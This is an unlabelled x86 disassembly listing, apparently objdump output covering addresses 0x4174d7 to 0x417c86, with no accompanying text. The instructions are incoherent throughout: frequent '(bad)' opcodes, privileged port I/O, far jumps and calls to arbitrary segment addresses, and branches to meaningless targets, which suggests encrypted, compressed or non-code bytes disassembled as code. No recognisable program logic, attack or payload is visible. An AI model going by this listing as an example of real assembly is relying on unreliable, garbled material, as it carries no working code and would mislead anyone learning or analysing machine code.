  4174d7:	push   esi
  4174d8:	pop    ebx
  4174d9:	out    dx,eax
  4174da:	inc    ebp
  4174db:	cmp    BYTE PTR [esi-0x29eb80c6],bl
  4174e1:	push   ebx
  4174e2:	pop    ebp
  4174e3:	test   al,0xf1
  4174e5:	and    BYTE PTR [edx+0x5e],dl
  4174e8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4174ea:	and    DWORD PTR [esi+0x63aff27],ebx
  4174f0:	xchg   ebp,eax
  4174f1:	stc    
  4174f2:	pop    ebp
  4174f3:	out    dx,al
  4174f4:	frstor [ecx]
  4174f6:	jne    0x41747c
  4174f8:	js     0x4174c6
  4174fa:	cmp    al,0x6c
  4174fc:	inc    eax
  4174fd:	or     dl,BYTE PTR [ecx+0x1b10d13b]
  417503:	pop    edx
  417504:	sub    DWORD PTR ds:0xb4fa043f,eax
  41750a:	jge    0x41752b
  41750c:	in     al,dx
  41750d:	inc    ebp
  41750e:	mov    ds:0x3252e31a,al
  417513:	ret    
  417514:	stos   BYTE PTR es:[edi],al
  417515:	cmp    DWORD PTR [edi+0x46],esp
  417518:	das    
  417519:	(bad)  
  41751a:	in     al,0xb
  41751c:	dec    ebx
  41751d:	jle    0x417506
  41751f:	shl    bl,cl
  417521:	xchg   esi,eax
  417522:	(bad)  
  417524:	push   ebx
  417525:	loope  0x4174ac
  417527:	aaa    
  417528:	jns    0x417527
  41752a:	sub    eax,0x93d92a32
  41752f:	xchg   ebx,eax
  417530:	mov    bl,0x9
  417532:	das    
  417533:	or     eax,0xd8acc54b
  417538:	stos   DWORD PTR es:[edi],eax
  417539:	cmp    esi,ebx
  41753b:	and    al,0x21
  41753d:	in     eax,0x28
  41753f:	jp     0x417588
  417541:	daa    
  417542:	pop    edi
  417543:	sbb    DWORD PTR [edi],edi
  417545:	call   0xe84d9f34
  41754a:	or     dh,BYTE PTR [ebx]
  41754c:	xchg   ecx,eax
  41754d:	sub    cl,BYTE PTR [esp-0x38e31ca1]
  417554:	aaa    
  417555:	cmp    dl,BYTE PTR [edx-0x1a8e9b28]
  41755b:	dec    edi
  41755c:	hlt    
  41755d:	jae    0x4175c1
  41755f:	clc    
  417560:	pop    esp
  417561:	xchg   esp,eax
  417562:	das    
  417563:	(bad)  
  417564:	mov    BYTE PTR [edi+0x73],0x7
  417568:	test   BYTE PTR [ebx-0x38],ch
  41756b:	mov    dl,0x34
  41756d:	jno    0x417578
  41756f:	cli    
  417570:	stc    
  417571:	loope  0x4175c3
  417573:	xchg   edx,eax
  417574:	dec    eax
  417575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417576:	ret    
  417577:	retf   0x3347
  41757a:	xor    bl,dl
  41757c:	push   es
  41757d:	mov    cl,0x1
  41757f:	mov    cl,0x24
  417581:	push   cs
  417582:	cwde   
  417583:	imul   esp,DWORD PTR [ecx+0x1c],0x3d272f2
  41758a:	inc    esi
  41758b:	mov    ch,0xb
  41758d:	mov    al,ds:0xb8303305
  417592:	das    
  417593:	cmc    
  417594:	cmp    DWORD PTR [ebp+0x66417945],0x6e58dd07
  41759e:	xor    dh,BYTE PTR [edx+0x4a]
  4175a1:	sbb    eax,0xf03e4988
  4175a6:	in     al,0x2d
  4175a8:	inc    eax
  4175a9:	jbe    0x4175bc
  4175ab:	jmp    0x41758b
  4175ad:	mov    cl,0xd8
  4175af:	idiv   DWORD PTR [esi+0x1eccaa6a]
  4175b5:	mov    ah,0xd5
  4175b7:	push   ecx
  4175b8:	loopne 0x417591
  4175ba:	bound  ebp,QWORD PTR [ecx+eax*4-0x7c]
  4175be:	sub    ebp,DWORD PTR [ecx+eax*2-0x73074e29]
  4175c5:	xchg   BYTE PTR [esi],bh
  4175c7:	inc    edi
  4175c8:	fmul   QWORD PTR [esi]
  4175ca:	cmp    al,0x63
  4175cc:	and    dl,BYTE PTR [edx+ecx*4+0x8]
  4175d0:	mul    DWORD PTR [edx-0x56ad7544]
  4175d6:	push   0x8
  4175d8:	dec    ebx
  4175d9:	test   edi,edi
  4175db:	pop    edx
  4175dc:	pop    es
  4175dd:	stos   DWORD PTR es:[edi],eax
  4175de:	pop    eax
  4175df:	add    DWORD PTR [eax-0x18],ebx
  4175e2:	in     eax,dx
  4175e3:	shl    ebp,cl
  4175e5:	loope  0x4175d7
  4175e7:	jl     0x41757b
  4175e9:	pop    ds
  4175ea:	pop    ecx
  4175eb:	test   DWORD PTR [ecx],ebp
  4175ed:	xchg   esi,eax
  4175ee:	and    al,0x4d
  4175f0:	shl    DWORD PTR [ebx+0x6228f68],0x4d
  4175f7:	pop    ebp
  4175f8:	je     0x4175f0
  4175fa:	mov    ecx,0xd5cbc588
  4175ff:	xor    DWORD PTR [ebx],ebp
  417601:	fsub   st(6),st
  417603:	mov    cl,0x4b
  417605:	cmp    al,0x48
  417607:	icebp  
  417608:	dec    edi
  417609:	dec    edi
  41760a:	fisub  WORD PTR [edx-0x58fa78b6]
  417610:	aam    0x20
  417612:	stos   BYTE PTR es:[edi],al
  417613:	mov    cl,0x8e
  417615:	lods   eax,DWORD PTR ds:[esi]
  417616:	mov    eax,0x10da3a60
  41761b:	mov    edx,0x51deb720
  417620:	aad    0x16
  417622:	popf   
  417623:	ins    BYTE PTR es:[edi],dx
  417624:	dec    edi
  417625:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417628:	ret    0xf3a8
  41762b:	jne    0x4175fd
  41762d:	lock xchg edi,eax
  41762f:	pop    ebx
  417630:	stos   BYTE PTR es:[edi],al
  417631:	loop   0x4175c8
  417633:	call   FWORD PTR [ecx]
  417635:	cmp    al,0x50
  417637:	or     ah,BYTE PTR [ebx+edi*8]
  41763a:	jne    0x4175c7
  41763c:	jns    0x417617
  41763e:	cmp    al,0x8c
  417640:	shl    DWORD PTR [eax],1
  417642:	cmp    eax,0x1b48a8d5
  417647:	mov    WORD PTR [edx+ebp*2+0x3e883f6c],fs
  41764e:	in     al,0xe9
  417650:	xlat   BYTE PTR ds:[ebx]
  417651:	sub    DWORD PTR [esi+edx*2],edx
  417654:	adc    BYTE PTR [eax-0x3f495075],dl
  41765a:	test   BYTE PTR [ebx-0x24],bh
  41765d:	push   eax
  41765e:	stc    
  41765f:	or     ecx,DWORD PTR [edi-0x57f720d]
  417665:	aaa    
  417666:	pop    ecx
  417667:	cs jo  0x4176e1
  41766a:	sbb    edx,DWORD PTR [edx-0x4196f038]
  417670:	xchg   esi,eax
  417671:	fld    st(1)
  417673:	mov    esp,0xf99e1f1e
  417678:	adc    eax,0x2918491b
  41767d:	and    BYTE PTR [esi],0x84
  417680:	out    dx,eax
  417681:	pop    edx
  417682:	push   0xab2e673
  417687:	inc    si
  417689:	push   ds
  41768a:	lock pop ss
  41768c:	ret    
  41768d:	enter  0xf81c,0x75
  417691:	sahf   
  417692:	shr    bh,1
  417694:	mov    bh,0xeb
  417696:	stos   BYTE PTR es:[edi],al
  417697:	sbb    ah,BYTE PTR fs:[ecx-0x75]
  41769b:	sub    DWORD PTR [ebx+0x57],edx
  41769e:	stos   DWORD PTR es:[edi],eax
  41769f:	jb     0x4176a0
  4176a1:	sub    DWORD PTR [eax+0x352b5653],eax
  4176a7:	sub    al,0xb9
  4176a9:	cmc    
  4176aa:	shl    dh,0xc
  4176ad:	cmp    DWORD PTR [edi],0xfffffff9
  4176b0:	outs   dx,DWORD PTR ds:[esi]
  4176b1:	fdivr  QWORD PTR [eax-0x63248df8]
  4176b7:	mov    ah,0xb9
  4176b9:	or     bh,bl
  4176bb:	mov    al,0x6e
  4176bd:	jl     0x4176c0
  4176bf:	inc    ebx
  4176c0:	cwde   
  4176c1:	std    
  4176c2:	int    0x2b
  4176c4:	mov    dl,BYTE PTR [edx+ebx*4-0x6a8ee287]
  4176cb:	push   edx
  4176cc:	aaa    
  4176cd:	push   0xfffffff9
  4176cf:	fild   DWORD PTR [ebx]
  4176d1:	mov    ecx,0xa3651727
  4176d6:	pop    ebx
  4176d7:	loope  0x4176d3
  4176d9:	in     eax,dx
  4176da:	or     bl,BYTE PTR [ebx]
  4176dc:	aad    0xa4
  4176de:	shr    BYTE PTR [ebx+0x35f630a9],cl
  4176e4:	push   ecx
  4176e5:	les    esi,FWORD PTR [eax+ebx*1]
  4176e8:	jbe    0x4176ba
  4176ea:	sbb    DWORD PTR [edi+0x636a59a],0x8268396e
  4176f4:	jmp    eax
  4176f6:	pop    ss
  4176f7:	out    dx,al
  4176f8:	or     cl,BYTE PTR [edi-0x3b]
  4176fb:	jmp    DWORD PTR [ecx+0x2]
  4176fe:	dec    ecx
  4176ff:	js     0x4176d0
  417701:	pop    ebp
  417702:	sub    eax,DWORD PTR [ebx+0x74]
  417705:	int3   
  417706:	repnz lahf 
  417708:	jne    0x41777c
  41770a:	or     ecx,0xffffffd4
  41770d:	(bad)  
  41770e:	mov    dh,0x9e
  417710:	or     esi,DWORD PTR ds:0xd88f9228
  417716:	aam    0xcc
  417718:	(bad)  
  417719:	fisub  WORD PTR [ebx+edx*8]
  41771c:	sti    
  41771d:	je     0x417719
  41771f:	xchg   esi,eax
  417720:	inc    esp
  417721:	shr    DWORD PTR [ebp+0xee0c1fa],1
  417727:	call   0x9952f979
  41772c:	(bad)  
  41772e:	xchg   edi,eax
  41772f:	pop    ds
  417730:	repnz push ss
  417732:	dec    ebp
  417733:	call   FWORD PTR [esi+esi*4+0x4f]
  417737:	adc    DWORD PTR [ebx-0x1e3d6c41],eax
  41773d:	fwait
  41773e:	jmp    0xa1331454
  417743:	jecxz  0x417772
  417745:	pop    eax
  417746:	fbld   TBYTE PTR [edi-0x28da814d]
  41774c:	cmp    al,0xa8
  41774e:	pop    eax
  41774f:	cmp    ah,ah
  417751:	std    
  417752:	es pop ebp
  417754:	pop    ecx
  417755:	cli    
  417756:	adc    al,BYTE PTR [eax]
  417758:	pushf  
  417759:	and    DWORD PTR [esi+ecx*2+0x26],ebp
  41775d:	jmp    0x41777f
  41775f:	mov    WORD PTR [eax+0x20],fs
  417762:	pop    ebp
  417763:	push   edx
  417764:	pop    ebp
  417765:	adc    DWORD PTR [ebp-0x6b],0x57
  417769:	loop   0x417741
  41776b:	sub    DWORD PTR [ecx-0x7a],0x19
  41776f:	jmp    0xda35:0x42a33cca
  417776:	cmc    
  417777:	ins    BYTE PTR es:[edi],dx
  417778:	rol    BYTE PTR [edx],1
  41777a:	aaa    
  41777b:	cwde   
  41777c:	adc    eax,0xa9c34a3c
  417781:	xchg   BYTE PTR [ebx+0x16],al
  417784:	test   DWORD PTR [ecx-0x3b],ebx
  417787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417788:	sbb    bh,0xf0
  41778b:	retf   
  41778c:	xor    ebp,ebp
  41778e:	sub    cl,BYTE PTR [esi+0x4b6c0aad]
  417794:	push   ss
  417795:	rcr    BYTE PTR [ebp+ebx*4-0x20c5ff7a],cl
  41779c:	iret   
  41779d:	xchg   ebp,eax
  41779e:	imul   esi,DWORD PTR [eax+0x6e524f6e],0x26
  4177a5:	jge    0x41775a
  4177a7:	rcl    DWORD PTR ds:0xe0c64915,1
  4177ad:	fimul  DWORD PTR [esi-0x79]
  4177b0:	lahf   
  4177b1:	sbb    ch,BYTE PTR gs:[ebp+0x639c5ba8]
  4177b8:	mov    ebp,0x8eca2da9
  4177bd:	imul   BYTE PTR [ebx+0x1d]
  4177c0:	jo     0x4177f7
  4177c2:	sbb    al,0x6f
  4177c4:	jmp    0xcf1c:0x2efe4ae5
  4177cb:	(bad)  
  4177cc:	mov    ebp,0x61b626e8
  4177d1:	xor    bh,al
  4177d3:	not    DWORD PTR [esi+0x63c9a28c]
  4177d9:	pushf  
  4177da:	mov    BYTE PTR [edi+0x66],ah
  4177dd:	cwde   
  4177de:	sub    DWORD PTR [edi+0xf],0xf5c110c1
  4177e5:	fnstsw WORD PTR [ebx]
  4177e7:	push   ecx
  4177e8:	add    bh,dl
  4177ea:	xchg   DWORD PTR [eax+0x384c1c51],ebp
  4177f0:	sub    eax,0xcd5dead5
  4177f5:	mov    dl,0xa1
  4177f7:	fstp   TBYTE PTR [ecx+0x3b3a8720]
  4177fd:	sub    al,0x80
  4177ff:	mov    cl,0x80
  417801:	cli    
  417802:	call   0x6532:0x305e07bc
  417809:	in     eax,dx
  41780a:	sti    
  41780b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41780c:	push   esi
  41780d:	gs sub eax,0xf7d9d502
  417813:	pop    ebp
  417814:	bound  edx,QWORD PTR [ebx-0x74]
  417817:	cmp    BYTE PTR [ecx+0x23],0x8a
  41781b:	push   edi
  41781c:	ss push eax
  41781e:	and    ebp,DWORD PTR [edx]
  417820:	test   eax,0xd09296e2
  417825:	jae    0x4177c9
  417827:	adc    ch,BYTE PTR [ecx+0x3ea85c73]
  41782d:	aaa    
  41782e:	retf   
  41782f:	loope  0x417833
  417831:	jle    0x417869
  417833:	push   esi
  417834:	mov    ah,0x56
  417836:	out    dx,al
  417837:	aaa    
  417838:	and    ebp,eax
  41783a:	jmp    0x5268254c
  41783f:	mov    ecx,0xa4b02ae0
  417844:	jbe    0x4178b5
  417846:	xchg   esi,eax
  417847:	and    eax,0x615cc26b
  41784c:	and    BYTE PTR [ecx],dh
  41784e:	cwde   
  41784f:	mov    eax,0xd136b5df
  417854:	gs push ecx
  417856:	(bad)  
  417857:	push   ss
  417858:	retf   
  417859:	lds    edx,FWORD PTR [esi+0x1b]
  41785c:	in     eax,dx
  41785d:	nop
  41785e:	mov    bl,0x9
  417860:	fs clc 
  417862:	arpl   WORD PTR [ecx+edi*8+0xeda5545],di
  417869:	(bad)  
  41786a:	arpl   WORD PTR ds:[edi+0x44],bx
  41786e:	stos   DWORD PTR es:[edi],eax
  41786f:	and    DWORD PTR [edx],esp
  417871:	mov    edx,fs
  417873:	into   
  417874:	pop    ebp
  417875:	push   esi
  417876:	inc    ebp
  417877:	mov    dh,0x2f
  417879:	mov    DWORD PTR [ecx-0x50752ab4],ecx
  41787f:	leave  
  417880:	scas   al,BYTE PTR es:[edi]
  417881:	pop    ss
  417882:	mov    edi,ebx
  417884:	add    esp,esp
  417886:	dec    ebx
  417887:	repnz (bad) ss:[edi-0x38]
  41788c:	add    ebx,DWORD PTR [ecx+0x794122dd]
  417892:	leave  
  417893:	popf   
  417894:	fadd   DWORD PTR [edx+0x416b476a]
  41789a:	in     al,0xdc
  41789c:	pop    eax
  41789d:	rol    BYTE PTR [ecx-0x79],cl
  4178a0:	xor    cx,sp
  4178a3:	scas   eax,DWORD PTR es:[edi]
  4178a4:	jo     0x4178c1
  4178a6:	jl     0x417880
  4178a8:	sbb    al,0xa8
  4178aa:	shr    DWORD PTR [eax+0x686b44ac],cl
  4178b0:	xor    DWORD PTR [esi],ecx
  4178b2:	and    BYTE PTR [esi],ch
  4178b4:	xchg   DWORD PTR [edi+eax*2],edi
  4178b7:	aad    0x95
  4178b9:	push   ebp
  4178ba:	loop   0x4178ba
  4178bc:	out    dx,eax
  4178bd:	leave  
  4178be:	out    dx,eax
  4178bf:	in     al,0x31
  4178c1:	clc    
  4178c2:	pop    ebx
  4178c3:	lahf   
  4178c4:	add    eax,0xf32acc4c
  4178c9:	cmp    bl,bh
  4178cb:	mov    edi,0x3a5b75a0
  4178d0:	mov    ebp,0xdc8e2f77
  4178d5:	cld    
  4178d6:	in     al,dx
  4178d7:	fwait
  4178d8:	mov    eax,0xfb706c04
  4178dd:	sbb    DWORD PTR [ebp-0x79f1554a],ebx
  4178e3:	adc    eax,DWORD PTR gs:[ebp+esi*1-0x670a26ac]
  4178eb:	push   cs
  4178ec:	mov    DWORD PTR [eax],ecx
  4178ee:	hlt    
  4178ef:	ds mov ecx,0x7cf9738f
  4178f5:	sbb    al,0xf2
  4178f7:	scas   al,BYTE PTR es:[edi]
  4178f8:	and    eax,0x3cfe771a
  4178fd:	jl     0x41787f
  4178ff:	fnstcw WORD PTR ss:[ebp-0x531aa087]
  417906:	leave  
  417907:	push   eax
  417908:	pop    eax
  417909:	mov    edi,0x3cb4a3bf
  41790e:	cmp    ebp,DWORD PTR [edx]
  417910:	inc    ebp
  417911:	iret   
  417912:	fwait
  417913:	xchg   edx,eax
  417914:	pop    ds
  417915:	xchg   esp,eax
  417916:	gs cmp eax,0x191d2d93
  41791c:	sbb    DWORD PTR [ebp+ebp*1-0x72],eax
  417920:	sbb    ah,ch
  417922:	jns    0x41799d
  417924:	retf   0xe1e1
  417927:	fdivr  DWORD PTR [ebp+0x704679a0]
  41792d:	dec    ebp
  41792e:	aas    
  41792f:	sub    ebp,DWORD PTR [edx]
  417931:	add    eax,0x8a5dc291
  417936:	inc    esi
  417937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417938:	push   ss
  417939:	sub    al,0x7d
  41793b:	push   edx
  41793c:	mov    ebx,0x4bfba999
  417941:	into   
  417942:	mov    cl,0xf1
  417944:	add    DWORD PTR [eax+0x6a],ecx
  417947:	push   es
  417948:	mov    ecx,0x6c4d7d02
  41794d:	inc    edi
  41794e:	push   ds
  41794f:	jne    0x417947
  417951:	cmp    esp,DWORD PTR [ecx+0x2f]
  417954:	retf   
  417955:	dec    ebp
  417956:	imul   eax,DWORD PTR [ebp+0x59],0xffffff93
  41795a:	nop
  41795b:	shr    esp,1
  41795d:	outs   dx,BYTE PTR ds:[esi]
  41795e:	push   edx
  41795f:	mov    eax,ds:0x2b5d1f0e
  417964:	pusha  
  417965:	push   ss
  417966:	sbb    BYTE PTR [ebp-0x790e9a5c],dh
  41796c:	outs   dx,BYTE PTR ds:[esi]
  41796d:	es popf 
  41796f:	sahf   
  417970:	push   esp
  417971:	rcl    DWORD PTR [ebx-0x76],1
  417974:	(bad)  
  417975:	data16 mov al,0x10
  417978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417979:	aaa    
  41797a:	(bad)  
  41797b:	ss test bh,0x7e
  41797f:	loope  0x417998
  417981:	jp     0x4179d7
  417983:	jecxz  0x417987
  417985:	pop    ebx
  417986:	loop   0x4179cd
  417988:	inc    esp
  417989:	pusha  
  41798a:	mov    ds:0x4a72820,eax
  41798f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417990:	out    dx,al
  417991:	imul   DWORD PTR [ecx+eiz*1+0x69b84477]
  417998:	fwait
  417999:	add    al,0xe1
  41799b:	out    dx,eax
  41799c:	js     0x417997
  41799e:	add    edx,DWORD PTR [edi]
  4179a0:	push   esi
  4179a1:	xchg   ecx,eax
  4179a2:	or     BYTE PTR [ebx],ah
  4179a4:	cld    
  4179a5:	fst    DWORD PTR [esi]
  4179a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179a8:	xor    BYTE PTR [edi+edi*4],bh
  4179ab:	and    BYTE PTR [eax-0x47],ah
  4179ae:	fnsave [ebp-0xe0e7b84]
  4179b4:	push   esi
  4179b5:	mov    ch,0x23
  4179b7:	cmp    al,0x1
  4179b9:	out    0x69,al
  4179bb:	ds pop ss
  4179bd:	sahf   
  4179be:	js     0x4179af
  4179c0:	int3   
  4179c1:	pop    ecx
  4179c2:	ss callw 0x2e41
  4179c7:	xchg   BYTE PTR [eax+0xf13e3fc],bh
  4179cd:	in     eax,0xb6
  4179cf:	sbb    edi,DWORD PTR [ebp+0x1e]
  4179d2:	popf   
  4179d3:	fwait
  4179d4:	in     eax,0x6d
  4179d6:	cmp    al,0x1f
  4179d8:	das    
  4179d9:	lock dec eax
  4179db:	(bad)  
  4179dd:	shr    ecx,0x6b
  4179e0:	sar    DWORD PTR ds:0x3668dc3d,1
  4179e6:	inc    eax
  4179e7:	mov    ebp,0x103775c3
  4179ec:	sub    ebx,DWORD PTR [ebx]
  4179ee:	push   esp
  4179ef:	es ins BYTE PTR es:[edi],dx
  4179f1:	fisttp WORD PTR [edi+0x742d5729]
  4179f7:	add    cl,BYTE PTR [ebx]
  4179f9:	or     al,BYTE PTR [edi]
  4179fb:	rol    DWORD PTR [edi],1
  4179fd:	fdiv   QWORD PTR [esi-0x6]
  417a00:	and    ecx,0x77aa5219
  417a06:	push   eax
  417a07:	out    dx,eax
  417a08:	mov    ds:0x9461ddf8,eax
  417a0d:	dec    ecx
  417a0e:	lahf   
  417a0f:	and    DWORD PTR [ebx],0x982e8cef
  417a15:	fwait
  417a16:	pop    ebx
  417a17:	dec    ecx
  417a18:	daa    
  417a19:	push   cs
  417a1a:	jb     0x4179d3
  417a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a1d:	jns    0x4179b0
  417a1f:	fwait
  417a20:	sbb    eax,0x79e1ebcc
  417a25:	outs   dx,DWORD PTR ds:[esi]
  417a26:	push   ebp
  417a27:	xchg   ebp,eax
  417a28:	or     al,0xe9
  417a2a:	sahf   
  417a2b:	inc    edi
  417a2c:	sbb    BYTE PTR [ebx],al
  417a2e:	leave  
  417a2f:	or     eax,eax
  417a31:	enter  0x744a,0xa7
  417a35:	aad    0x2b
  417a37:	mov    ecx,0x6b6635b0
  417a3c:	sahf   
  417a3d:	out    dx,al
  417a3e:	cmp    BYTE PTR [ebx-0x46],0x1b
  417a42:	in     al,0x18
  417a44:	dec    esi
  417a45:	xchg   ch,dl
  417a47:	mov    edi,0xba19efa3
  417a4c:	rcl    BYTE PTR [ebx+ebp*8+0x39de8c82],0x9b
  417a54:	mov    dh,0xfb
  417a56:	popa   
  417a57:	push   ebx
  417a58:	jb     0x417a5c
  417a5a:	pop    ebp
  417a5b:	sahf   
  417a5c:	cmp    BYTE PTR [eax+0x2d],bl
  417a5f:	std    
  417a60:	ret    0xe708
  417a63:	mov    ah,0xf
  417a65:	jmp    0x25ba:0x6cec47a5
  417a6c:	sub    DWORD PTR [esi+0x47f9797a],esi
  417a72:	sub    ch,BYTE PTR [eax+0x59]
  417a75:	adc    DWORD PTR [esi],eax
  417a77:	cld    
  417a78:	dec    ebx
  417a79:	idiv   BYTE PTR [edx+eax*8+0x37]
  417a7d:	push   es
  417a7e:	test   ebp,eax
  417a80:	test   al,0x3f
  417a82:	push   ss
  417a83:	xor    DWORD PTR [eax+0x1be73f68],esi
  417a89:	lock sub BYTE PTR [eax],ch
  417a8c:	loopne 0x417a6f
  417a8e:	sbb    eax,0xd28961a4
  417a93:	enter  0xc5b,0x61
  417a97:	iret   
  417a98:	adc    ah,BYTE PTR [ebx-0x77]
  417a9b:	and    al,BYTE PTR [ebp+0x74]
  417a9e:	fwait
  417a9f:	xchg   BYTE PTR [esi+0x5b],dh
  417aa2:	hlt    
  417aa3:	pop    edx
  417aa4:	xchg   esi,eax
  417aa5:	cld    
  417aa6:	out    0xe9,al
  417aa8:	in     eax,dx
  417aa9:	sub    al,0xf9
  417aab:	popa   
  417aac:	jg     0x417a33
  417aae:	pop    ecx
  417aaf:	sub    eax,0xcbf349ce
  417ab4:	pop    edi
  417ab5:	into   
  417ab6:	xor    dl,BYTE PTR [ebx+ebx*4-0x7d]
  417aba:	(bad)  
  417abb:	aaa    
  417abc:	clc    
  417abd:	pusha  
  417abe:	(bad)  
  417abf:	fs pop edi
  417ac1:	push   ebp
  417ac2:	and    eax,0xab9b175e
  417ac7:	push   ss
  417ac8:	(bad)  
  417aca:	gs push ds
  417acc:	fs push cs
  417ace:	dec    esp
  417acf:	pop    ebp
  417ad0:	scas   eax,DWORD PTR es:[edi]
  417ad1:	mov    bh,0x79
  417ad3:	sub    al,0x6f
  417ad5:	push   0xfffffff9
  417ad7:	das    
  417ad8:	out    0xf7,al
  417ada:	loopne 0x417aac
  417adc:	loopne 0x417b40
  417ade:	les    edx,FWORD PTR [ecx+ebx*4]
  417ae1:	jns    0x417b5b
  417ae3:	push   ss
  417ae4:	loopne 0x417ac5
  417ae6:	xchg   DWORD PTR [ecx-0x58],esi
  417ae9:	(bad)  
  417aeb:	addr16 pop edi
  417aed:	clc    
  417aee:	adc    eax,0xcf902adb
  417af3:	xchg   ecx,eax
  417af4:	sub    BYTE PTR [ecx+ebp*2-0xb7fa895],al
  417afb:	inc    eax
  417afc:	cmp    eax,0x7aa2f0d9
  417b01:	call   0x3c1d:0xcd91e85c
  417b08:	pushf  
  417b09:	dec    edx
  417b0a:	rol    edx,cl
  417b0c:	pop    esp
  417b0d:	jle    0x417b60
  417b0f:	pop    ebp
  417b10:	push   0x10d8a934
  417b15:	push   esp
  417b16:	jmp    FWORD PTR ds:0x9e2f7be3
  417b1c:	pop    edx
  417b1d:	mov    ds:0xfb2aa87,al
  417b22:	aaa    
  417b23:	aaa    
  417b24:	call   0x9a894c2a
  417b29:	loop   0x417b97
  417b2b:	repnz xor DWORD PTR [ebx+0x26dba9a0],ebp
  417b32:	clc    
  417b33:	pop    ebp
  417b34:	or     bh,BYTE PTR [eax+ebx*4-0xf]
  417b38:	sbb    eax,0xbf1d20af
  417b3d:	xor    eax,0xe474cf8a
  417b42:	inc    ebx
  417b43:	cmp    al,0xf5
  417b45:	and    eax,ecx
  417b47:	and    eax,0x9d5014aa
  417b4c:	cmp    BYTE PTR ds:0x5ad6c52c,ch
  417b52:	call   0x4a3215a2
  417b57:	pop    ebx
  417b58:	and    al,0xc3
  417b5a:	ret    
  417b5b:	and    DWORD PTR [ebx+0xc],ebx
  417b5e:	daa    
  417b5f:	xchg   ebp,eax
  417b60:	lods   al,BYTE PTR ds:[esi]
  417b61:	add    esp,DWORD PTR [edi-0x746ff99c]
  417b67:	jbe    0x417bc9
  417b69:	repz (bad) 
  417b6b:	fst    DWORD PTR [edi+edi*4]
  417b6e:	sbb    al,0x1e
  417b70:	xor    BYTE PTR [eax-0x58],0x8d
  417b74:	jmp    0x417bd9
  417b76:	push   edx
  417b77:	(bad)  
  417b78:	arpl   WORD PTR fs:[esi+0x37d7050],ax
  417b7f:	adc    BYTE PTR [ebp-0x6],bh
  417b82:	(bad)  
  417b84:	cmc    
  417b85:	mov    bl,0x68
  417b87:	inc    ebp
  417b88:	add    eax,ecx
  417b8a:	in     al,dx
  417b8b:	iret   
  417b8c:	lods   eax,DWORD PTR ds:[esi]
  417b8d:	sbb    eax,0xcba439cc
  417b92:	mov    eax,0x3e6df2aa
  417b97:	call   0xb23d:0xac2ea62f
  417b9e:	jmp    0x48ea:0x151a1282
  417ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba6:	adc    DWORD PTR ds:[edi-0x63],eax
  417baa:	clc    
  417bab:	sar    BYTE PTR [eax+0xc],0x49
  417baf:	and    al,0xa2
  417bb1:	mov    edi,0x3e0bb7f9
  417bb6:	xor    dh,BYTE PTR [si]
  417bb9:	test   al,0xd1
  417bbb:	jge    0x417c10
  417bbd:	pusha  
  417bbe:	or     BYTE PTR [edi-0x5b1b4cfe],dl
  417bc4:	add    al,0x43
  417bc6:	or     edi,DWORD PTR [ecx-0x3490ad8a]
  417bcc:	push   es
  417bcd:	jae    0x417c3f
  417bcf:	mov    esi,esi
  417bd1:	bound  ecx,QWORD PTR [edi]
  417bd3:	ins    BYTE PTR es:[edi],dx
  417bd4:	jne    0x417be7
  417bd6:	add    BYTE PTR [ebp-0x165653e5],cl
  417bdc:	es sub al,0x7d
  417bdf:	inc    edi
  417be0:	sub    ebx,edx
  417be2:	mov    al,ds:0xb88f3a6d
  417be7:	mov    edx,0x6566c0c
  417bec:	aad    0x1e
  417bee:	xchg   esi,eax
  417bef:	jbe    0x417c33
  417bf1:	pop    ebx
  417bf2:	inc    ebx
  417bf3:	and    eax,0xee5b90a7
  417bf8:	mov    cl,0xfd
  417bfa:	jo     0x417c51
  417bfc:	cdq    
  417bfd:	cmp    DWORD PTR [ecx+0x1a683da5],ebp
  417c03:	sub    bp,WORD PTR [ebp+edi*2-0x36]
  417c08:	leave  
  417c09:	push   ebp
  417c0a:	lock dec edx
  417c0c:	cmp    al,0xfd
  417c0e:	adc    ebp,ebx
  417c10:	(bad)  
  417c11:	fcomp  DWORD PTR [ebx]
  417c13:	dec    DWORD PTR [ecx-0x2e]
  417c16:	inc    ecx
  417c17:	dec    eax
  417c18:	stos   BYTE PTR es:[edi],al
  417c19:	lods   eax,DWORD PTR ds:[esi]
  417c1a:	adc    DWORD PTR [ebx],esi
  417c1c:	loop   0x417c1c
  417c1e:	jns    0x417bd4
  417c20:	pop    edx
  417c21:	pop    edi
  417c22:	cmp    al,0xc1
  417c24:	mov    esp,0xabaad780
  417c29:	aam    0xb9
  417c2b:	xchg   edi,eax
  417c2c:	xor    eax,0x429540ca
  417c31:	and    ah,al
  417c33:	rcr    BYTE PTR [edi+0x533d6c6d],0x85
  417c3a:	jmp    0x417c8d
  417c3c:	push   es
  417c3d:	rcr    DWORD PTR [eax+0x74b83828],0x11
  417c44:	sub    cl,BYTE PTR [esi]
  417c46:	jle    0x417bd8
  417c48:	xor    esi,edi
  417c4a:	js     0x417c36
  417c4c:	out    0x5f,eax
  417c4e:	xlat   BYTE PTR ds:[ebx]
  417c4f:	sbb    ah,BYTE PTR [ecx]
  417c51:	add    BYTE PTR [ebx+0x219f4f5f],ah
  417c57:	or     eax,0xad0b1592
  417c5c:	lock aam 0xfc
  417c5f:	pop    ds
  417c60:	xchg   esp,eax
  417c61:	jp     0x417c49
  417c63:	and    dh,BYTE PTR [edx+esi*4+0xebe37b6]
  417c6a:	cli    
  417c6b:	pop    edi
  417c6c:	out    dx,eax
  417c6d:	aad    0x9f
  417c6f:	repz adc al,0x44
  417c72:	sbb    al,0x8c
  417c74:	jae    0x417c77
  417c76:	stos   BYTE PTR es:[edi],al
  417c77:	iret   
  417c78:	inc    ebp
  417c79:	add    eax,0xa43b28c1
  417c7e:	je     0x417c44
  417c80:	data16 adc BYTE PTR [edi],cl
  417c83:	dec    esi
  417c84:	jge    0x417c9d
  417c86:	ds rol BYTE PTR fs:[edx-0x31f7580e],cl
